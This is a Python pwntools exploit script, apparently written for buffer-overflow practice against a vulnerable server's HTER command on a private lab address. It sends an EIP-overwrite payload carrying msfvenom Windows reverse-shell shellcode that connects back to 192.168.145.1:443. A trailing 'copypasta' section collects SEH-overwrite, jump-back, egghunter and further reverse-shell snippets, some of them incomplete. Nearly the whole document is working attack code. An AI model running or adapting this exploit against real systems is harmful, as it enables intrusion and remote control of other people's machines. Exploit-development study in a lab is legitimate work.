#!/usr/bin/python3

from pwn import *

# === Target info ===
host = "192.168.145.129"
port = 9999
s = remote(host, port)

# === Initial Variables ===
vulncmd = b"HTER " # this should cause the crash
crash = 4000 # a payload of this size triggers the crash

# === EIP overwrite ===
cyclic_pattern = str.encode(cyclic(4000,"123456789ABCDEF")) # generate cyclic pattern as byte array, alphanumeric only
#cyclic_pattern = cyclic_metasploit(4000) # metasploit version
offset = 2047 - 6 # offset of EIP
junk = b"A" * offset
eip = b"BBBB" # To test if we successfully overwrite the EIP
new_eip = binascii.hexlify(p32(0x625011af)) # address convert to little endian
nop_sled = b"90"*32 # just some NOPS to slide into her DMs.. I mean my shellcode


# === Payload ===

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.145.1 LPORT=443 -b "\x00" -f hex EXINTFUNC=thread
shellcode = b"bdac833462dac3d97424f45829c9b15231681283e8fc03c48dd697e87a9458107bf9d1f54a39857efc89cdd2f16283c682070ce923ad6ac4b49e4f4737dd83a7062ed6a64f531bfa181f8eea2d5513817e7b1376367a32294c2594c8815d9dd2c65857693c1666bb0cd7c582a02a17c307d5623d746875fa06b6f018a03da2c45091358f5f5e31d74361966c7fea19a209a83d66516a5f3f3fdd605fe082c4140dd674775a1bb5879a33cef4a89c64928055a365e64f13f9197064d0dd24344af744df8af89070da564b318a163bd9c09864f9eb720d901615f2cd89e49a0fa9e7e1994f8d05ccd83abf5592db4040dfdccb6720923b0d3243cc5868c2d3760488461dd4c77a8a83804dc3413df77d77bc6145331b5248baeeee6eac36ee2a98e6b9e476411047201bcf01a4da2392b2e269645a52c431655b80b51e813039f50140705723c9dd027194ddf9b6a15d0b47567d7e421239933e0bac93ed2ce5"
payload = b"".join([
    vulncmd,
    junk,
    new_eip,
    nop_sled,
    shellcode
])

payload += b"C" * (crash - len(payload)) # padding

print(payload)
s.send(payload)
s.close()



# ================================================
# Copypasta. Copy relevant stuff and delete later
# ================================================

# === General ===
nop_sled = b"90"*32 # just some NOPS to slide into her DMs.. I mean my shellcode

# === EIP overwrite ===
cyclic_pattern = str.encode(cyclic(4000,"123456789ABCDEF")) # generate cyclic pattern as byte array, alphanumeric only
cyclic_pattern = cyclic_metasploit(4000) # metasploit version
offset = 2047 # offset of EIP
junk = b"A" * offset
eip = b"BBBB" # To test if we successfully overwrite the EIP
new_eip = p32(0x00000000) # address convert to little endian

# === SEH ===
nseh = p32(0x09eb9090)  # 2x noops, then jump 9 bytes to the next A (eb means JMP SHORT)
seh = p32(0x625010b4)  # pop pop ret - find with !mona seh


# === Jumping ===

# Manual jump based on stack difference
jumpback = asm("push esp; pop eax; add ax, 0x565; jmp eax;") # b'TXf\x05e\x05\xff\xe0'
jumpback = b"\x54\x58\x66\x05\x65\x05\xff\xe0" # manual hand encoding from nasmshell - also working

# === egghunter ===

# !mona egg (-t EGGG) - defaults to w00t if tag not specified
egghunter = (
    
)
shellcode = b"w00tw00t"  # egghunter tag
shellcode +=  binascii.unhexlify("be3c4638")

# === Shellcode ===
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.145.1 LPORT=443 -b "\x00" -f hex EXINTFUNC=thread
shellcode = binascii.unhexlify("be3c4638")

# traditional payload style
# msfvenom -p windows/shell_reverse_tcp -b "\x00" lhost=192.168.145.1 lport=443 -f py -v shellcode EXINTFUNC=thread


